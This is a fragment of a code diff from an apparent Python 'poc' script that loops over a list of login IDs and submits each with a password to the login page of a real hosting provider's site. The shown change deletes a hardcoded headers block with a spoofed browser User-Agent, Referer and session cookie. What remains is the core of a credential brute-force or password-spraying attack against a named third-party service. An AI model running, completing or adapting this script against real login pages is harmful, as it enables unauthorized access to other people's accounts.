@@ -50,12 +50,7 @@ def poc(i):
     try:
         for each in list1:
             url = 'http://beijing.51idc.com/login'
-            h = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0',
-                'Referer': 'http://beijing.51idc.com/login',
-                'Cookie': 'PHPSESSID=t5u3ij8i1ijr8c5s8rcsvmki55',
-                'Connection': 'keep-alive'
-            }
+
             d = {
                 'LoginId': str(each),
                 'LoginPasswd': str(i)
